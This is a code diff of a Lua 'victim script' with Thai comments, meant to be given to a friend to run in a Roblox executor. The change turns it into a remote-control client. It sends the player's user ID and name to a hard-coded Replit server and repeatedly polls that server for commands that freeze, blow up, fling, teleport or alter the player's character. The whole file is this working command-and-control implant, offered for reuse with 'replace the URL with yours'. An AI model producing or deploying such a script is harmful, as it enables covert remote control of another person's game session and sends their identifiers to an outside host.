@@ -1,27 +1,62 @@
 -- ===========================================
--- VICTIM SCRIPT (เพื่อนรัน)
--- รันแล้วไม่มีอะไรแสดง
+-- VICTIM SCRIPT - Remote Control
+-- ให้เพื่อนรันใน Roblox Executor
 -- ===========================================
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+print("🌐 REMOTE CONTROL VICTIM SCRIPT")
+print("👤 Player:", LocalPlayer.Name)
+print("🆔 User ID:", LocalPlayer.UserId)
+
+-- ⚠️ เปลี่ยน URL นี้เป็นของคุณ!
+local SERVER_URL = "https://414aac7e-b745-411d-9730-ded3092e5d80-00-2pab606sq7y1h.pike.replit.dev/api"
+local VICTIM_ID = tostring(LocalPlayer.UserId)
+local VICTIM_NAME = LocalPlayer.Name
 
 -- ตัวแปรเก็บสถานะ
 local IsFrozen = false
 local OriginalWalkSpeed = 16
 local OriginalJumpPower = 50
 
-print("[Victim] Script loaded silently...")
-print("[Victim] My name:", LocalPlayer.Name)
-print("[Victim] Waiting for admin commands...")
+-- Function รายงานตัวไปยังเซิร์ฟเวอร์
+local function reportToServer()
+    local success = pcall(function()
+        HttpService:PostAsync(
+            SERVER_URL .. "/report",
+            HttpService:JSONEncode({
+                victim_id = VICTIM_ID,
+                victim_name = VICTIM_NAME
+            }),
+            Enum.HttpContentType.ApplicationJson
+        )
+    end)
+    return success
+end
 
--- สร้าง RemoteEvent สำหรับรับคำสั่ง
-local Receiver = Instance.new("RemoteEvent")
-Receiver.Name = "VictimReceiver_" .. LocalPlayer.Name -- ใช้ชื่อแทน ID
-Receiver.Parent = game:GetService("ReplicatedStorage")
+-- Function ขอคำสั่งจากเซิร์ฟเวอร์
+local function fetchCommands()
+    local success, response = pcall(function()
+        return HttpService:GetAsync(
+            SERVER_URL .. "/commands?victim_id=" .. VICTIM_ID,
+            true
+        )
+    end)
+    
+    if success and response then
+        local data = HttpService:JSONDecode(response)
+        return data.commands or {}
+    end
+    return {}
+end
 
--- ฟังก์ชันรับคำสั่ง
-Receiver.OnClientEvent:Connect(function(command, ...)
+-- Function ประมวลผลคำสั่ง
+local function executeCommand(cmdData)
+    local command = cmdData.command
+    local args = cmdData.args or {}
+    
     if command == "freeze" then
         if IsFrozen then return end
         IsFrozen = true
@@ -33,7 +68,6 @@ Receiver.OnClientEvent:Connect(function(command, ...)
             humanoid.WalkSpeed = 0
             humanoid.JumpPower = 0
             
-            -- ล็อกทุกส่วน
             for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.Anchored = true
@@ -50,7 +84,6 @@ Receiver.OnClientEvent:Connect(function(command, ...)
             humanoid.WalkSpeed = OriginalWalkSpeed
             humanoid.JumpPower = OriginalJumpPower
             
-            -- คลายล็อก
             for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.Anchored = false
@@ -69,14 +102,7 @@ Receiver.OnClientEvent:Connect(function(command, ...)
             local explosion = Instance.new("Explosion")
             explosion.Position = LocalPlayer.Character.HumanoidRootPart.Position
             explosion.BlastRadius = 12
-            explosion.BlastPressure = 50000
             explosion.Parent = workspace
-        end
-        
-    elseif command == "bring" then
-        local targetPos = ...
-        if targetPos and LocalPlayer.Character then
-            LocalPlayer.Character:MoveTo(targetPos)
         end
         
     elseif command == "slap" then
@@ -84,16 +110,33 @@ Receiver.OnClientEvent:Connect(function(command, ...)
             local force = Instance.new("BodyVelocity")
             force.Velocity = Vector3.new(0, 100, 0)
             force.MaxForce = Vector3.new(0, 100000, 0)
-            force.P = 10000
             force.Parent = LocalPlayer.Character.HumanoidRootPart
-            
             task.wait(0.5)
             force:Destroy()
         end
+        
+    elseif command == "bring" then
+        if args[1] and LocalPlayer.Character then
+            LocalPlayer.Character:MoveTo(args[1])
+        end
+        
+    elseif command == "speed" then
+        local speed = args[1] or 16
+        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = speed
+        end
+        
+    elseif command == "jump" then
+        local jump = args[1] or 50
+        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.JumpPower = jump
+        end
     end
-end)
+end
 
--- อัพเดทเมื่อสลับตัวละคร
+-- เมื่อตัวละครเปลี่ยน
 LocalPlayer.CharacterAdded:Connect(function()
     if IsFrozen then
         task.wait(1)
@@ -105,3 +148,33 @@ LocalPlayer.CharacterAdded:Connect(function()
     end
 end)
 
+-- Main loop
+spawn(function()
+    print("📡 Connecting to server...")
+    
+    if reportToServer() then
+        print("✅ Connected to server!")
+        print("🔗 Server URL:", SERVER_URL)
+    else
+        print("❌ Failed to connect")
+        return
+    end
+    
+    while true do
+        pcall(function()
+            -- รายงานตัวทุก 30 วินาที
+            if os.time() % 30 == 0 then
+                reportToServer()
+            end
+            
+            -- ดึงคำสั่ง
+            local commands = fetchCommands()
+            for _, cmd in ipairs(commands) do
+                executeCommand(cmd)
+            end
+        end)
+        task.wait(2)
+    end
+end)
+
+print("🎮 Ready! Waiting for commands...")
